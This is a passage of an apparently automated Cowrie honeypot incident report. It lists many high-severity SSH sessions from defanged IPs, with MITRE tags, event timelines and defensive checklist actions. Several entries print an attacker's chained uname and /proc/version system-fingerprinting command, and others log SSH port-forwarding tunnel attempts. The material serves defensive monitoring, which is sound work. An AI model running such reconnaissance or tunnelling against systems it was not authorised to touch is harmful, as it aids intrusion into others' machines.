| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:34:48` | `cowrie.session.connect` |
| `2026-08-29 13:34:48` | `cowrie.client.version` |
| `2026-08-29 13:34:48` | `cowrie.client.kex` |
| `2026-08-29 13:34:50` | `cowrie.login.success` |
| `2026-08-29 13:34:51` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:34:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]59` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-904f47751352

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:35 |
| **Last Seen** | 2026-08-29 13:35 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:35:42` | `cowrie.session.connect` |
| `2026-08-29 13:35:44` | `cowrie.client.version` |
| `2026-08-29 13:35:44` | `cowrie.client.kex` |
| `2026-08-29 13:35:50` | `cowrie.login.success` |
| `2026-08-29 13:35:52` | `cowrie.session.params` |
| `2026-08-29 13:35:52` | `cowrie.command.input` |
| `2026-08-29 13:35:52` | `cowrie.command.input` |
| `2026-08-29 13:35:52` | `cowrie.command.input` |
| `2026-08-29 13:35:52` | `cowrie.command.input` |
| `2026-08-29 13:35:52` | `cowrie.command.input` |
| `2026-08-29 13:35:52` | `cowrie.command.success` |
| `2026-08-29 13:35:52` | `cowrie.command.input` |
| `2026-08-29 13:35:52` | `cowrie.command.input` |
| `2026-08-29 13:35:52` | `cowrie.command.input` |
| `2026-08-29 13:35:52` | `cowrie.command.input` |
| `2026-08-29 13:35:53` | `cowrie.log.closed` |
| `2026-08-29 13:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c15fa4095a5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:37 |
| **Last Seen** | 2026-08-29 13:37 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:37:30` | `cowrie.session.connect` |
| `2026-08-29 13:37:33` | `cowrie.client.version` |
| `2026-08-29 13:37:33` | `cowrie.client.kex` |
| `2026-08-29 13:37:41` | `cowrie.login.success` |
| `2026-08-29 13:37:46` | `cowrie.session.params` |
| `2026-08-29 13:37:46` | `cowrie.command.input` |
| `2026-08-29 13:37:46` | `cowrie.command.input` |
| `2026-08-29 13:37:46` | `cowrie.command.input` |
| `2026-08-29 13:37:46` | `cowrie.command.input` |
| `2026-08-29 13:37:46` | `cowrie.command.input` |
| `2026-08-29 13:37:46` | `cowrie.command.success` |
| `2026-08-29 13:37:46` | `cowrie.command.input` |
| `2026-08-29 13:37:46` | `cowrie.command.input` |
| `2026-08-29 13:37:46` | `cowrie.command.input` |
| `2026-08-29 13:37:46` | `cowrie.command.input` |
| `2026-08-29 13:37:48` | `cowrie.log.closed` |
| `2026-08-29 13:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdb4ae09b627

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:39 |
| **Last Seen** | 2026-08-29 13:39 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:39:18` | `cowrie.session.connect` |
| `2026-08-29 13:39:20` | `cowrie.client.version` |
| `2026-08-29 13:39:20` | `cowrie.client.kex` |
| `2026-08-29 13:39:26` | `cowrie.login.success` |
| `2026-08-29 13:39:30` | `cowrie.session.params` |
| `2026-08-29 13:39:30` | `cowrie.command.input` |
| `2026-08-29 13:39:30` | `cowrie.command.input` |
| `2026-08-29 13:39:30` | `cowrie.command.input` |
| `2026-08-29 13:39:30` | `cowrie.command.input` |
| `2026-08-29 13:39:30` | `cowrie.command.input` |
| `2026-08-29 13:39:30` | `cowrie.command.success` |
| `2026-08-29 13:39:30` | `cowrie.command.input` |
| `2026-08-29 13:39:30` | `cowrie.command.input` |
| `2026-08-29 13:39:30` | `cowrie.command.input` |
| `2026-08-29 13:39:30` | `cowrie.command.input` |
| `2026-08-29 13:39:32` | `cowrie.log.closed` |
| `2026-08-29 13:39:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61bb52f1160c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 13:39 |
| **Last Seen** | 2026-08-29 13:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:39:21` | `cowrie.session.connect` |
| `2026-08-29 13:39:21` | `cowrie.client.version` |
| `2026-08-29 13:39:21` | `cowrie.client.kex` |
| `2026-08-29 13:39:22` | `cowrie.login.success` |
| `2026-08-29 13:39:22` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:39:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 13:39:22` | `cowrie.direct-tcpip.data` |
| `2026-08-29 13:39:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85cf89dfc6f0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 13:40 |
| **Last Seen** | 2026-08-29 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:40:17` | `cowrie.session.connect` |
| `2026-08-29 13:40:17` | `cowrie.client.version` |
| `2026-08-29 13:40:17` | `cowrie.client.kex` |
| `2026-08-29 13:40:18` | `cowrie.login.success` |
| `2026-08-29 13:40:18` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:40:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 13:40:18` | `cowrie.direct-tcpip.data` |
| `2026-08-29 13:40:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30da9767235e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:41 |
| **Last Seen** | 2026-08-29 13:41 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:41:02` | `cowrie.session.connect` |
| `2026-08-29 13:41:04` | `cowrie.client.version` |
| `2026-08-29 13:41:04` | `cowrie.client.kex` |
| `2026-08-29 13:41:12` | `cowrie.login.success` |
| `2026-08-29 13:41:15` | `cowrie.session.params` |
| `2026-08-29 13:41:15` | `cowrie.command.input` |
| `2026-08-29 13:41:15` | `cowrie.command.input` |
| `2026-08-29 13:41:15` | `cowrie.command.input` |
| `2026-08-29 13:41:15` | `cowrie.command.input` |
| `2026-08-29 13:41:15` | `cowrie.command.input` |
| `2026-08-29 13:41:15` | `cowrie.command.success` |
| `2026-08-29 13:41:15` | `cowrie.command.input` |
| `2026-08-29 13:41:15` | `cowrie.command.input` |
| `2026-08-29 13:41:15` | `cowrie.command.input` |
| `2026-08-29 13:41:15` | `cowrie.command.input` |
| `2026-08-29 13:41:17` | `cowrie.log.closed` |
| `2026-08-29 13:41:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-898997460f02

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:42 |
| **Last Seen** | 2026-08-29 13:43 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:42:49` | `cowrie.session.connect` |
| `2026-08-29 13:42:50` | `cowrie.client.version` |
| `2026-08-29 13:42:50` | `cowrie.client.kex` |
| `2026-08-29 13:42:57` | `cowrie.login.success` |
| `2026-08-29 13:43:00` | `cowrie.session.params` |
| `2026-08-29 13:43:00` | `cowrie.command.input` |
| `2026-08-29 13:43:00` | `cowrie.command.input` |
| `2026-08-29 13:43:00` | `cowrie.command.input` |
| `2026-08-29 13:43:00` | `cowrie.command.input` |
| `2026-08-29 13:43:00` | `cowrie.command.input` |
| `2026-08-29 13:43:00` | `cowrie.command.success` |
| `2026-08-29 13:43:00` | `cowrie.command.input` |
| `2026-08-29 13:43:00` | `cowrie.command.input` |
| `2026-08-29 13:43:00` | `cowrie.command.input` |
| `2026-08-29 13:43:00` | `cowrie.command.input` |
| `2026-08-29 13:43:03` | `cowrie.log.closed` |
| `2026-08-29 13:43:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9b4b40b520a

| Field | Detail |
|---|---|
| **Source IP** | `41.178.230[.]115` |
| **First Seen** | 2026-08-29 13:43 |
| **Last Seen** | 2026-08-29 13:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:43:24` | `cowrie.session.connect` |
| `2026-08-29 13:43:24` | `cowrie.client.version` |
| `2026-08-29 13:43:24` | `cowrie.client.kex` |
| `2026-08-29 13:43:25` | `cowrie.login.success` |
| `2026-08-29 13:43:26` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:43:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.178.230[.]115` to AbuseIPDB if not already reported
- [ ] Block `41.178.230[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a43d5758079

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]41` |
| **First Seen** | 2026-08-29 13:43 |
| **Last Seen** | 2026-08-29 13:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:43:31` | `cowrie.session.connect` |
| `2026-08-29 13:43:32` | `cowrie.client.version` |
| `2026-08-29 13:43:32` | `cowrie.client.kex` |
| `2026-08-29 13:43:33` | `cowrie.login.success` |
| `2026-08-29 13:43:34` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:43:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb969620438a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:44 |
| **Last Seen** | 2026-08-29 13:44 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:44:32` | `cowrie.session.connect` |
| `2026-08-29 13:44:33` | `cowrie.client.version` |
| `2026-08-29 13:44:33` | `cowrie.client.kex` |
| `2026-08-29 13:44:39` | `cowrie.login.success` |
| `2026-08-29 13:44:43` | `cowrie.session.params` |
| `2026-08-29 13:44:43` | `cowrie.command.input` |
| `2026-08-29 13:44:43` | `cowrie.command.input` |
| `2026-08-29 13:44:43` | `cowrie.command.input` |
| `2026-08-29 13:44:43` | `cowrie.command.input` |
| `2026-08-29 13:44:43` | `cowrie.command.input` |
| `2026-08-29 13:44:43` | `cowrie.command.success` |
| `2026-08-29 13:44:43` | `cowrie.command.input` |
| `2026-08-29 13:44:43` | `cowrie.command.input` |
| `2026-08-29 13:44:43` | `cowrie.command.input` |
| `2026-08-29 13:44:43` | `cowrie.command.input` |
| `2026-08-29 13:44:44` | `cowrie.log.closed` |
| `2026-08-29 13:44:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-279a31752279

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:46 |
| **Last Seen** | 2026-08-29 13:46 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:46:19` | `cowrie.session.connect` |
| `2026-08-29 13:46:21` | `cowrie.client.version` |
| `2026-08-29 13:46:21` | `cowrie.client.kex` |
| `2026-08-29 13:46:27` | `cowrie.login.success` |
| `2026-08-29 13:46:31` | `cowrie.session.params` |
| `2026-08-29 13:46:31` | `cowrie.command.input` |
| `2026-08-29 13:46:31` | `cowrie.command.input` |
| `2026-08-29 13:46:31` | `cowrie.command.input` |
| `2026-08-29 13:46:31` | `cowrie.command.input` |
| `2026-08-29 13:46:31` | `cowrie.command.input` |
| `2026-08-29 13:46:31` | `cowrie.command.success` |
| `2026-08-29 13:46:31` | `cowrie.command.input` |
| `2026-08-29 13:46:31` | `cowrie.command.input` |
| `2026-08-29 13:46:31` | `cowrie.command.input` |
| `2026-08-29 13:46:31` | `cowrie.command.input` |
| `2026-08-29 13:46:32` | `cowrie.log.closed` |
| `2026-08-29 13:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79d4f91b073c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:47 |
| **Last Seen** | 2026-08-29 13:48 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:47:57` | `cowrie.session.connect` |
| `2026-08-29 13:47:58` | `cowrie.client.version` |
| `2026-08-29 13:47:58` | `cowrie.client.kex` |
| `2026-08-29 13:48:05` | `cowrie.login.success` |
| `2026-08-29 13:48:08` | `cowrie.session.params` |
| `2026-08-29 13:48:08` | `cowrie.command.input` |
| `2026-08-29 13:48:08` | `cowrie.command.input` |
| `2026-08-29 13:48:08` | `cowrie.command.input` |
| `2026-08-29 13:48:08` | `cowrie.command.input` |
| `2026-08-29 13:48:08` | `cowrie.command.input` |
| `2026-08-29 13:48:08` | `cowrie.command.success` |
| `2026-08-29 13:48:08` | `cowrie.command.input` |
| `2026-08-29 13:48:08` | `cowrie.command.input` |
| `2026-08-29 13:48:08` | `cowrie.command.input` |
| `2026-08-29 13:48:08` | `cowrie.command.input` |
| `2026-08-29 13:48:10` | `cowrie.log.closed` |
| `2026-08-29 13:48:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a040206b457

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 13:49 |
| **Last Seen** | 2026-08-29 13:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:49:38` | `cowrie.session.connect` |
| `2026-08-29 13:49:38` | `cowrie.client.version` |
| `2026-08-29 13:49:38` | `cowrie.client.kex` |
| `2026-08-29 13:49:41` | `cowrie.login.success` |
| `2026-08-29 13:49:41` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:49:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 13:49:41` | `cowrie.direct-tcpip.data` |
| `2026-08-29 13:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63289d96f4ed

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:49 |
| **Last Seen** | 2026-08-29 13:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:49:39` | `cowrie.session.connect` |
| `2026-08-29 13:49:40` | `cowrie.client.version` |
| `2026-08-29 13:49:40` | `cowrie.client.kex` |
| `2026-08-29 13:49:44` | `cowrie.login.success` |
| `2026-08-29 13:49:47` | `cowrie.session.params` |
| `2026-08-29 13:49:47` | `cowrie.command.input` |
| `2026-08-29 13:49:47` | `cowrie.command.input` |
| `2026-08-29 13:49:47` | `cowrie.command.input` |
| `2026-08-29 13:49:47` | `cowrie.command.input` |
| `2026-08-29 13:49:47` | `cowrie.command.input` |
| `2026-08-29 13:49:47` | `cowrie.command.success` |
| `2026-08-29 13:49:47` | `cowrie.command.input` |
| `2026-08-29 13:49:47` | `cowrie.command.input` |
| `2026-08-29 13:49:47` | `cowrie.command.input` |
| `2026-08-29 13:49:47` | `cowrie.command.input` |
| `2026-08-29 13:49:48` | `cowrie.log.closed` |
| `2026-08-29 13:49:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f1471e75af4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 13:49 |
| **Last Seen** | 2026-08-29 13:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:49:56` | `cowrie.session.connect` |
| `2026-08-29 13:49:56` | `cowrie.client.version` |
